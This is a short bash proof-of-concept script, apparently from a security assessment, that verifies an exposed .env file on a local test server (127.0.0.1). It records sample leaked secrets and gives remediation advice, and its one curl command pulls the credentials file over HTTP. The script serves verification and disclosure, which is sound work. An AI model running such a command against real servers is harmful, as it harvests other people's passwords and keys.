#!/bin/bash
# PoC: Exposed Environment File (.env) (MISCONF-001)  CVSS 9.8
# Target: 127.0.0.1
# Verified evidence: HTTP 200, Content-Type text/plain; charset=utf-8, secrets marker: "APP_ENV=production\nDB_PASSWORD=hunter2\nSECRET_KEY=abc123"
# Remediation: Block dotfiles at the edge and rotate every secret in the file.
set -u
curl -s -D- "http://127.0.0.1:19090/.env" | head -c 2000
